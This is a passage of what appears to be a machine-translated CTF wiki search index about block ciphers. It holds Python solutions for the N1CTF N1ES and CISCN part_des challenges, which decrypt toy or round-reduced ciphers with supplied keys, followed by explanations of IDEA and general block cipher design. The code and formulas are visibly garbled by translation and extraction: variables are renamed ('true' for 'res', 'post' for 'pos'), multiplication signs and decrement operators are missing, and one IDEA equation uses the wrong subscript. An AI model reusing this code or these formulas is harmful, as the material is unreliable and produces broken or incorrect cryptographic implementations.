31 , 41 , 5 , 189 , 27 ] def generate ( o ): k = permutate ( s_box , o ) b = [] for i in range ( 0 , len ( k ), 7 ): b . append ( k [ i : i + 7 ] + [ 1 ]) c = [] for i in range ( 32 ): post = 0 x = 0 for j in b [ i ]: x += ( j << pos ) post + = 1 c . append (( 0x10001 ** x ) % ( 0x7f )) return c class N1ES : def __init__ ( self , key ): if ( len ( key ) != 24 or isinstance ( key , bytes ) == False ): raise Exception ( \"key must be 24 bytes long\" ) self . key = key self . gen_subkey () def gen_subkey ( self ): o = string_to_bits ( self . key ) k = [] for i in range ( 8 ): o = generate ( o ) k . extend ( o ) o = string_to_bits ([ chr ( c ) for c in o [ 0 : 24 ]]) self . Kn = [] for i in range ( 32 ): self . Kn . append ( map ( chr , k [ i * 8 : i * 8 + 8 ])) return def encrypt ( self , plaintext ): if ( len ( plaintext ) % 16 != 0 or isinstance ( plaintext , bytes ) == False ): raise Exception ( \"plaintext must be a multiple of 16 in length\" ) true = & #39;&#39; for i in range ( len ( plaintext ) / 16 ): block = plaintext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ round_cnt ])) L , R = R , L res += L + R return res Obviously, we can think of it as a way of Feistel encryption, the decryption function is as follows def decrypt ( self , ciphertext ): true = & #39;&#39; for i in range ( len ( ciphertext ) / 16 ): block = ciphertext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ 31 - round_cnt ])) L , R = R , L res += L + R return res The final result is \u279c baby_N1ES cat challenge.py from N1ES import N1ES import base64 key = \"wxy191iss00000000000cute\" n1es = N1ES ( key ) flag = \"N1CTF{*****************************************}\" cipher = n1es.encrypt ( flag ) #print base64.b64encode(cipher) # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx cipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx' cipher = base64.b64decode ( cipher ) print n1es.decrypt ( cipher ) \u279c baby_N1ES python challenge.py N1CTF { F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d _ / - / }","title":"2018 N1CTF N1ES"},{"location":"crypto/blockcipher/des/#2019-ciscn-part_des","text":"The title only gave one file: Round n part_encode-> 0x92d915250119e12b Key map -> 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84 Considering the title name and data characteristics, Round n part_encode is the intermediate result of executing n rounds of des, and Key map should be the subkey of des. To restore the plaintext, only the reverse process of n rounds of des encryption can be performed. Pay attention to the following three points when decrypting. Subkey selection, for only n rounds of encryption results, the decryption should use the keys n, n-1..., 1 in sequence. des After the last round of operations, the unfinished des does not exchange the left and right parts and the inverse initial permutation, so we should perform these two steps on the ciphertext first. n choice, in this question, we don't know n, but it doesn't matter, we can try all possible values (0-15) flag should be ascii string. ??? note \"Solution code\" ``` python kkk = 16 def bit_rot_left(lst, pos): return lst[pos:] + lst[:pos] class DES: IP = [ 58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8, 57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7 ] IP_re = [ 40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25 ] Pbox = [ 16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10, 2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25 ] E = [ 32,1,2,3,4,5,4,5,6,7,8,9, 8,9,10,11,12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21,22,23,24,25, 24,25,26,27,28,29,28,29,30,31,32,1 ] PC1 = [ 57,49,41,33,25,17,9,1,58,50,42,34,26,18, 10,2,59,51,43,35,27,19,11,3,60,52,44,36, 63,55,47,39,31,23,15,7,62,54,46,38,30,22, 14,6,61,53,45,37,29,21,13,5,28,20,12,4 ] PC2 = [ 14,17,11,24,1,5,3,28,15,6,21,10, 23,19,12,4,26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40,51,45,33,48, 44,49,39,56,34,53,46,42,50,36,29,32 ] Sbox = [ [ [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7], [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8], [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0], [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], ], [ [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10], [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5], [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15], [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], ], [ [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8], [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1], [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7], [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], ], [ [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15], [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9], [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4], [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], ], [ [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9], [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6], [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14], [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], ], [ [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11], [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8], [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6], [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], ], [ [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1], [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6], [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2], [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], ], [ [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7], [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2], [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8], [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11], ] ] rout = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1] def __init__(self): self.subkey = [[[1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0]], [[1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1]]] def permute(self, lst, tb): return [lst[i-1] for i in tb] def f(self,riti,subkeyi): tmp = [i^j for i,j in zip(subkeyi,self.permute(riti,DES.E))] return self.permute(sum([[int(l) for l in str(bin(DES.Sbox[i][int(str(tmp[6*i])+str(tmp[6*i+5]),2)][int(\"\".join(str(j) for j in tmp[6*i+1:6*i+5]),2)])[2:].zfill(4))] for i in range(8)],[]),DES.Pbox) def des_main(self,m,mark): sbkey = self.subkey[0] #if mark == 'e' else self.subkey[1] # tmp = self.permute([int(i) for i in list((m).ljust(64,\"0\"))],self.IP) tmp = [int(i) for i in list((m).ljust(64,\"0\"))] global kkk print (kkk) for i in range(kkk): tmp = tmp[32:] + [j^k for j,k in zip(tmp[:32],self.f(tmp[32:],sbkey[i if mark != 'd' else kkk-1-i]))] return \"\".join([str(i) for i in self.permute(tmp[32:]+tmp[:32],self.IP_re)]) def des_encipher(self,m): m = \"\".join([bin(ord(i))[2:].zfill(8) for i in m]) des_en = self.des_main (m, 'e') return \"\".join([chr(int(des_en[i 8:i 8+8],2)) for i in range(8)]) def des_decipher(self,c): c = \"\".join([bin(ord(i))[2:].zfill(8) for i in c]) des_de = self.des_main (c, 'd') return \"\".join([chr(int(des_de[i 8:i 8+8],2)) for i in range(8)]) def test(): import base64 global kkk while kkk >=0: desobj = DES () # cipher = desobj.des_encipher(\"12345678\") cipher = '\\x01\\x19\\xe1+\\x92\\xd9\\x15%' message1 = desobj.des_decipher(cipher) print(message1) kkk = 1 if name ==' main ': test() ``` Decryption result (partial): 14 t-\u00cfE\u00cfx\u0090\u00a7 13 y0ur9Ood 12 \u03bcp ^ \u00db\u00e9 = \u00b9 11 ) \u00c1`r\u00fb\u00d5\u00fb It can be seen that n is 13, and flag is flag{y0ur9Ood}","title":"2019 CISCN part_des"},{"location":"crypto/blockcipher/des/#reference","text":"Tsinghua University graduate data security courseware - https://en.wikipedia.org/wiki/Data_Encryption_Standard","title":"Reference"},{"location":"crypto/blockcipher/idea/","text":"IDEA \u00b6 Overview \u00b6 **International Data Encryption Algorithm (IDEA), first known as the Improved Proposed Encryption Standard (IPES), is a symmetric key block cipher in cryptography. James Massey and Lai Xuejia Design, first introduced in 1991. This algorithm was proposed to replace the old data encryption standard DES. (from Wikipedia) Basic Process \u00b6 Key Generation \u00b6 IDEA uses 6 keys in each round of encryption and then 4 keys in the final output round. So there are a total of 52. The first 8 keys are from the original key of the algorithm, K1 is taken from the upper 16 bits of the key, and K8 is taken from the lower 16 bits of the key. Move the key loop left by 25 bits to get the next round key, and then divide it into 8 groups again. Encryption process \u00b6 The IDEA encrypted block is 64 bits in size and uses a key length of 128 bits. The algorithm performs the same transformation 8 times on the input data block, except that the key used each time is different, and finally an output transformation is performed. Each round of operation Both input and output can be a group of 16 bits. The main execution of each round has Bitwise XOR, \u2295 Modular plus, the modulus is 2^{16} 2^{16} , \u229e Modular multiplication, the modulus is 2^{16}+1 2^{16}+1 , \u2299. However, it should be noted that the input of 0x0000 will be modified to 2^{16} 2^{16} , and the output of 2^{16} 2^{16} will be modified to 0x0000. Here we call the encryption method of the middle square consisting of K5 and K6 as MA. This is also an important part of the IDEA algorithm. In addition, we call MA_L the left side result of this part of the encryption, which will end up with the leftmost 16 bits; MA_R is the result of the encrypted right part of the part, and finally Will work with the third 16 bits. The operation of the last output wheel is as follows Decryption process \u00b6 The decryption process is similar to the encryption process, mainly in the selection of its key. The first 4 subkeys of the decrypted key of the i(1-9)th round are derived from the first 4 subkeys of the 10 th -ith round of the encryption process where the 1 st and 4 th decryption subkeys are the multiplicative inverses of the corresponding subkeys for 2^{16}+1 2^{16}+1 . The second and third subkeys are taken as When the number of rounds is 2, ..., 8, the encrypted inverse of 2^{16} 2^{16} of the corresponding 3 rd and 2 nd subkeys is taken. When the number of rounds is 1 or 9, the encrypted inverse of 2^{16} 2^{16} corresponding to the corresponding 2 nd and 3 rd subkeys is taken. The 5 th and 6 th keys are unchanged. Overall process \u00b6 Let's prove the correctness of the algorithm. Here we focus on the first round of the decryption algorithm. First, let's first look at how Y_i Y_i is obtained. $ Y_1 = W_ {81} odot Z_ {49} $ $ Y_2 = W_ {83} boxplus Z_ {50} $ $ Y_3 = W_ {82} boxplus Z_ {51} $ $ Y_4 = W_ {83} odot Z_ {52} $ When decrypting, the first round of direct conversion is $ J_ {11} = Y_1 odot U_1 = Y_1 odot Z_ {49} ^ {- 1} = W_ {81} $ $ J_ {12} = Y_2 boxplus U2 = Y_2 boxplus Z_ {50} ^ {- 1} = W_ {83} $ $ J_ {13} = Y_3 boxplus U3 = Y_3 boxplus Z_ {51} ^ {- 1} = W_ {82} $ $ J_ {14} = Y_4 odot U_4 = Y_4 odot Z_ {52} ^ {- 1} = W_ {84} $ It can be seen that the result is only the opposite of the two 16-bit encryption results in the middle. Let's take a closer look at how W_{8i} W_{8i} was obtained. $ W_ {81} = I_ {81} oplus MA_R (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) $ $ W_ {82} = I_ {83} oplus MA_R (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) $ $ W_ {83} = I_ {82} oplus MA_L (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) $ $ W_ {84} = I_ {84} oplus MA_L (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) $ So for V11 $ V_ {11} = J_ {11} oplus MA_R (J_ {11} oplus J_ {13}, J_ {12} oplus J_ {14}) $ By simply bringing in the existing values, obviously $ V_ {11} = W_ {81} oplus MA_R (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) = I_ {81} $ For other elements, it is similar, then we will find that the first round of decryption results are exactly I_{81}, I_{83}, I_{82}, I_{84} I_{81}, I_{83}, I_{82}, I_{84} . Similarly, this relationship can be satisfied until $ V_ {81} = I_ {11}, V_ {82} = I_ {13}, V_ {83} = I_ {12}, V_ {84} = I_ {14} $ Then finally a simple output transformation happens to get the value that was originally encrypted. topic \u00b6 2017 HITCON seccomp","title":"IDEA"},{"location":"crypto/blockcipher/idea/#idea","text":"","title":"IDEA"},{"location":"crypto/blockcipher/idea/#overview","text":"**International Data Encryption Algorithm (IDEA), first known as the Improved Proposed Encryption Standard (IPES), is a symmetric key block cipher in cryptography. James Massey and Lai Xuejia Design, first introduced in 1991. This algorithm was proposed to replace the old data encryption standard DES. (from Wikipedia)","title":"Overview"},{"location":"crypto/blockcipher/idea/#basic-process","text":"","title":"Basic Process"},{"location":"crypto/blockcipher/idea/#key-generation","text":"IDEA uses 6 keys in each round of encryption and then 4 keys in the final output round. So there are a total of 52. The first 8 keys are from the original key of the algorithm, K1 is taken from the upper 16 bits of the key, and K8 is taken from the lower 16 bits of the key. Move the key loop left by 25 bits to get the next round key, and then divide it into 8 groups again.","title":"Key Generation"},{"location":"crypto/blockcipher/idea/#encryption-process","text":"The IDEA encrypted block is 64 bits in size and uses a key length of 128 bits. The algorithm performs the same transformation 8 times on the input data block, except that the key used each time is different, and finally an output transformation is performed. Each round of operation Both input and output can be a group of 16 bits. The main execution of each round has Bitwise XOR, \u2295 Modular plus, the modulus is 2^{16} 2^{16} , \u229e Modular multiplication, the modulus is 2^{16}+1 2^{16}+1 , \u2299. However, it should be noted that the input of 0x0000 will be modified to 2^{16} 2^{16} , and the output of 2^{16} 2^{16} will be modified to 0x0000. Here we call the encryption method of the middle square consisting of K5 and K6 as MA. This is also an important part of the IDEA algorithm. In addition, we call MA_L the left side result of this part of the encryption, which will end up with the leftmost 16 bits; MA_R is the result of the encrypted right part of the part, and finally Will work with the third 16 bits. The operation of the last output wheel is as follows","title":"Encryption process"},{"location":"crypto/blockcipher/idea/#decryption-process","text":"The decryption process is similar to the encryption process, mainly in the selection of its key. The first 4 subkeys of the decrypted key of the i(1-9)th round are derived from the first 4 subkeys of the 10 th -ith round of the encryption process where the 1 st and 4 th decryption subkeys are the multiplicative inverses of the corresponding subkeys for 2^{16}+1 2^{16}+1 . The second and third subkeys are taken as When the number of rounds is 2, ..., 8, the encrypted inverse of 2^{16} 2^{16} of the corresponding 3 rd and 2 nd subkeys is taken. When the number of rounds is 1 or 9, the encrypted inverse of 2^{16} 2^{16} corresponding to the corresponding 2 nd and 3 rd subkeys is taken. The 5 th and 6 th keys are unchanged.","title":"Decryption process"},{"location":"crypto/blockcipher/idea/#overall-process","text":"Let's prove the correctness of the algorithm. Here we focus on the first round of the decryption algorithm. First, let's first look at how Y_i Y_i is obtained. $ Y_1 = W_ {81} odot Z_ {49} $ $ Y_2 = W_ {83} boxplus Z_ {50} $ $ Y_3 = W_ {82} boxplus Z_ {51} $ $ Y_4 = W_ {83} odot Z_ {52} $ When decrypting, the first round of direct conversion is $ J_ {11} = Y_1 odot U_1 = Y_1 odot Z_ {49} ^ {- 1} = W_ {81} $ $ J_ {12} = Y_2 boxplus U2 = Y_2 boxplus Z_ {50} ^ {- 1} = W_ {83} $ $ J_ {13} = Y_3 boxplus U3 = Y_3 boxplus Z_ {51} ^ {- 1} = W_ {82} $ $ J_ {14} = Y_4 odot U_4 = Y_4 odot Z_ {52} ^ {- 1} = W_ {84} $ It can be seen that the result is only the opposite of the two 16-bit encryption results in the middle. Let's take a closer look at how W_{8i} W_{8i} was obtained. $ W_ {81} = I_ {81} oplus MA_R (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) $ $ W_ {82} = I_ {83} oplus MA_R (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) $ $ W_ {83} = I_ {82} oplus MA_L (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) $ $ W_ {84} = I_ {84} oplus MA_L (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) $ So for V11 $ V_ {11} = J_ {11} oplus MA_R (J_ {11} oplus J_ {13}, J_ {12} oplus J_ {14}) $ By simply bringing in the existing values, obviously $ V_ {11} = W_ {81} oplus MA_R (I_ {81} oplus I_ {83}, I_ {82} oplus I_ {84}) = I_ {81} $ For other elements, it is similar, then we will find that the first round of decryption results are exactly I_{81}, I_{83}, I_{82}, I_{84} I_{81}, I_{83}, I_{82}, I_{84} . Similarly, this relationship can be satisfied until $ V_ {81} = I_ {11}, V_ {82} = I_ {13}, V_ {83} = I_ {12}, V_ {84} = I_ {14} $ Then finally a simple output transformation happens to get the value that was originally encrypted.","title":"Overall process"},{"location":"crypto/blockcipher/idea/#topic","text":"2017 HITCON seccomp","title":"topic"},{"location":"crypto/blockcipher/introduction/","text":"\u5757\u52a0\u5bc6 \u00b6 Overview \u00b6 The so-called block encryption is to encrypt a piece of plaintext each time. Common encryption algorithms are available. IDEA encryption DES encryption AES encryption Block encryption is also symmetric encryption. In fact, we can also understand block encryption as a special alternative password, but each time it is replaced by a large block. It is precisely because of a large block, the plaintext space is huge, and for different keys, we can't make a table to correspond to the corresponding ciphertext, so we must have complex encryption and decryption algorithm to encrypt and decrypt the ciphertext . At the same time, plain text can often be very long or short, so two blocks are often needed for block encryption. padding, ie padding to the specified packet length Packet encryption mode, which is the way in which plaintext packets are encrypted. Basic strategy \u00b6 In the design of block ciphers, Shannon proposed two strategies: confusion and diffusion. Confusion \u00b6 Confusion, Confusion, makes the statistical relationship between the ciphertext and the key as complex as possible, so that the attacker can not guess the key even if it acquires some statistical characteristics of the ciphertext. Generally, complex nonlinear transformations can be used to get a good confusion. The common methods are as follows: S box Multiplication Diffusion \u00b6 Diffusion, Diffusion, makes every bit in the plaintext affect many bits in the ciphertext. Common methods are Linear transformation replacement shift, rotate Common encryption and decryption structure \u00b6 The main block block encryption currently used is the structure. Iterative structure, because the iterative structure is easy to design and implement, while facilitating security assessment. Iterative structure \u00b6 Overview \u00b6 The iterative structure is basically as follows, generally consisting of three parts Key replacement Round encryption function Round decryption function Round Function \u00b6 At present, the main functions of the round function are mainly the following design methods. Feistel Network, invented by Horst Feistel, one of the DES designers. DES Substitution-Permutation Network(SPN) AES Other programs Key Expansion \u00b6 At present, there are many methods for key expansion. There is no perfect key expansion method. The basic principle is that each bit of the key affects multiple rounds of round keys as much as possible.","title":"Introduction to Block Cipher"},{"location":"crypto/blockcipher/introduction/#_1","text":"","title":"\u5757\u52a0\u5bc6"},{"location":"crypto/blockcipher/introduction/#overview","text":"The so-called block encryption is to encrypt a piece of plaintext each time. Common encryption algorithms are available. IDEA encryption DES encryption AES encryption Block encryption is also symmetric encryption. In fact, we can also understand block encryption as a special alternative password, but each time it is replaced by a large block. It is precisely because of a large block, the plaintext space is huge, and for different keys, we can't make a table to correspond to the corresponding ciphertext, so we must have complex encryption and decryption algorithm to encrypt and decrypt the ciphertext . At the same time, plain text can often be very long or short, so two blocks are often needed for block encryption. padding, ie padding to the specified packet length Packet encryption mode, which is the way in which plaintext packets are encrypted.","title":"Overview"},{"location":"crypto/blockcipher/introduction/#basic-strategy","text":"In the design of block ciphers, Shannon proposed two strategies: confusion and diffusion.","title":"Basic strategy"},{"location":"crypto/blockcipher/introduction/#confusion","text":"Confusion, Confusion, makes the statistical relationship between the ciphertext and the key as complex as possible, so that the attacker can not guess the key even if it acquires some statistical characteristics of the ciphertext. Generally, complex nonlinear transformations can be used to get a good confusion. The common methods are as follows: S box Multiplication","title":"Confusion"},{"location":"crypto/blockcipher/introduction/#diffusion","text":"Diffusion, Diffusion, makes every bit in the plaintext affect many bits in the ciphertext. Common methods are Linear transformation replacement shift, rotate","title":"Diffusion"},{"location":"crypto/blockcipher/introduction/#common-encryption-and-decryption-structure","text":"The main block block encryption currently used is the structure. Iterative structure, because the iterative structure is easy to design and implement, while facilitating security assessment.","title":"Common encryption and decryption structure"},{"location":"crypto/blockcipher/introduction/#iterative-structure","text":"","title":"Iterative 